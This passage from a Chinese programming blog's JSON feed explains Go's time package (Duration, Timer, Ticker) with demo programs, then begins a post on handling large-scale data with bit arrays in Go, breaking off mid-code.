function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tstr <span class=\"token operator\">:=</span> <span class=\"token string\">\"2023-01-01 00:00:00\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tstrTime<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Parse</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>DateTime<span class=\"token punctuation\">,</span> str<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>strTime<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 2023-01-01 00:00:00 +0000 UTC</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"duration\"><a class=\"anchor\" href=\"#duration\">#</a> Duration</h2>\n<p>时间间隔</p>\n<p>Duration 将时间间隔表示为 int64 纳秒计数。 该表示法将最大可表示持续时间限制为大约 290 年。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> Duration <span class=\"token builtin\">int64</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 当前到 t 时过了多久 等价于 time.Now ().Sub (t).</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">Since</span><span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> Duration</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 当前到 t 时还有多久 等价于 t.Sub (time.Now ()).</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">Until</span><span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> Duration</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 多久</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> <span class=\"token function\">Hours</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> <span class=\"token function\">Minutes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> <span class=\"token function\">Seconds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> <span class=\"token function\">Milliseconds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> <span class=\"token function\">Microseconds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> <span class=\"token function\">Nanoseconds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> <span class=\"token function\">Truncate</span><span class=\"token punctuation\">(</span>m Duration<span class=\"token punctuation\">)</span> Duration</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> <span class=\"token function\">Round</span><span class=\"token punctuation\">(</span>m Duration<span class=\"token punctuation\">)</span> Duration</pre></td></tr></table></figure><p>demo：</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tt <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Second<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\td <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Since</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">.</span><span class=\"token function\">Minutes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 0.016668886883333334</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"timerticker\"><a class=\"anchor\" href=\"#timerticker\">#</a> Timer,Ticker</h2>\n<p>定时器，定时器是进程规划自己在未来某一时刻接获通知的一种机制。</p>\n<ul>\n<li>Timer: 到达指定时间触发且只触发一次。</li>\n<li>Ticker: 间隔特定时间触发。</li>\n</ul>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> Timer <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\">// 时间到了会把当前时间传到 C 中</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tC <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> Time</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tr runtimeTimer</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">type</span> Ticker <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">// 时间到了会把当前时间传到 C 中</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tC <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> Time</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tr runtimeTimer</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//runtimeTimer 结构与 runtime.timer 保持一致，所以下面介绍 runtime.timer</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">type</span> timer <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tpp puintptr</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">//timer 在 when 被唤醒，接着在 when+period 唤醒 (仅当 period>0)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// 每次 timer 在 goroutine 中调用 f (arg,now) 的时候，f 必须是一个函数而不是 block</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\twhen   <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tperiod <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tf      <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>any<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uintptr</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\targ    any</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tseq    <span class=\"token builtin\">uintptr</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token comment\">// 在 timerModifiedXX 状态下，将 when 字段设置为什么。</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tnextwhen <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token comment\">// The status field holds one of the values below.</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tstatus atomic<span class=\"token punctuation\">.</span>Uint32</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>新建 Timer</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 返回 Timer</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">NewTimer</span><span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>Timer</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 自带 goroutine</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">AfterFunc</span><span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">,</span> f <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>Timer</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 返回 Timer 的通道</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">After</span><span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> Time</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// 返回 Ticker</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">NewTicker</span><span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>Ticker</pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>Timer<span class=\"token punctuation\">)</span> <span class=\"token function\">Reset</span><span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>Timer<span class=\"token punctuation\">)</span> <span class=\"token function\">Stop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>Ticker<span class=\"token punctuation\">)</span> <span class=\"token function\">Reset</span><span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>Ticker<span class=\"token punctuation\">)</span> <span class=\"token function\">Stop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>demo：</strong></p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tt <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">NewTimer</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Second<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"time.NewTimer:\\t\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&lt;-</span>t<span class=\"token punctuation\">.</span>C<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tc <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">After</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>Second<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"time.After:\\t\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&lt;-</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">var</span> wg sync<span class=\"token punctuation\">.</span>WaitGroup</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\twg<span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">AfterFunc</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>Second<span class=\"token operator\">*</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// goroutine</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">defer</span> wg<span class=\"token punctuation\">.</span><span class=\"token function\">Done</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"time.AfterFunc:\\t\"</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\twg<span class=\"token punctuation\">.</span><span class=\"token function\">Wait</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">// 2023-12-26 06:24:05.735232696 +0000 UTC m=+0.000019777</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">// time.NewTimer:   2023-12-26 06:24:07.736438674 +0000 UTC m=+2.001225828</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">// time.After:      2023-12-26 06:24:08.736722245 +0000 UTC m=+3.001509399</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">// time.AfterFunc:  2023-12-26 06:24:09.736995409 +0000 UTC m=+4.001782545</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tt <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">NewTicker</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>Second <span class=\"token operator\">*</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">defer</span> t<span class=\"token punctuation\">.</span><span class=\"token function\">Stop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;-</span>t<span class=\"token punctuation\">.</span>C<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// 2023-12-26 06:30:20.909428813 +0000 UTC m=+1.000071030</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 2023-12-26 06:30:21.90954379 +0000 UTC m=+2.000186072</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">// 2023-12-26 06:30:22.909554203 +0000 UTC m=+3.000196480</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">// 2023-12-26 06:30:23.909497156 +0000 UTC m=+4.000139428</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 2023-12-26 06:30:24.909547462 +0000 UTC m=+5.000189724</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// 2023-12-26 06:30:25.909610114 +0000 UTC m=+6.000252360</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">// 2023-12-26 06:30:26.909803791 +0000 UTC m=+7.000446205</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// 2023-12-26 06:30:27.909542563 +0000 UTC m=+8.000184828</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">// 2023-12-26 06:30:28.909693368 +0000 UTC m=+9.000335659</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">// 2023-12-26 06:30:29.90956762 +0000 UTC m=+10.000210005</span></pre></td></tr></table></figure>",
            "tags": [
                "计算机科学",
                "GO",
                "Lib",
                "GO"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/15_BigData/",
            "url": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/15_BigData/",
            "title": "15-大规模数据场景",
            "date_published": "2023-12-13T15:00:00.000Z",
            "content_html": "<h1 id=\"大规模数据场景\"><a class=\"anchor\" href=\"#大规模数据场景\">#</a> 大规模数据场景</h1>\n<p>针对百万或者几十亿的数据的场景。</p>\n<h2 id=\"位存储\"><a class=\"anchor\" href=\"#位存储\">#</a> 位存储</h2>\n<p>使用位存储，使用位存储最大的好处是占用的空间更小。</p>\n<h3 id=\"1-使用4kb内存查找重复元素\"><a class=\"anchor\" href=\"#1-使用4kb内存查找重复元素\">#</a> 1. 使用 4KB 内存查找重复元素</h3>\n<p>题目要求：给定一个数组，包含从 1 到 N 的整数，N 最大为 32000，数组可能还有重复值，且 N 的取值不定，若只有 4KB 的内存可用，该如何打印数组中所有重复元素。</p>\n<p>如果只有 4KB 的空间，那么只能寻址 <code>8*4*2^10</code>  位，这个值比 32000 要大的，因此我们可以创建 32000 位的位向量 (比特数组)，其中一个比特位置就代表一个整数。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">printDuplicates</span><span class=\"token punctuation\">(</span>arr <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tbitArray <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32001</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 创建 32001 位的位向量，默认值为 false</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> num <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> arr <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> bitArray<span class=\"token punctuation\">[</span>num<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 打印重复的元素</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\tbitArray<span class=\"token punctuation\">[</span>num<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tarr <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">&#125;</span> <span class=\"token comment\">// 示例输入数组</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token function\">printDuplicates</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"2-从40个亿中找到一个不存在的整数\"><a class=\"anchor\" href=\"#2-从40个亿中找到一个不存在的整数\">#</a> 2. 从 40 个亿中找到一个不存在的整数</h3>\n<p>判断可行性，40 亿位的数组需要占用多少内存。</p>\n<p>4000000000/8/1000/1000 = 500MB 大约占用 500MB 内存</p>\n<p>建立一个长度为 40 亿的位数组</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">generateMissingNumber</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">const</span> size <span class=\"token operator\">=</span> <span class=\"token number\">4000000000</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tbitArray <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 创建长度为 40 亿的位数组，默认值为 false</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">// 随机填充位数组</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\trand<span class=\"token punctuation\">.</span><span class=\"token function\">Seed</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">UnixNano</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> size<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tnum <span class=\"token operator\">:=</span> rand<span class=\"token punctuation\">.</span><span class=\"token function\">Intn</span><span class=\"token punctuation\">(</span>size <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\tbitArray<span class=\"token punctuation\">[</span>num<span class=\"token 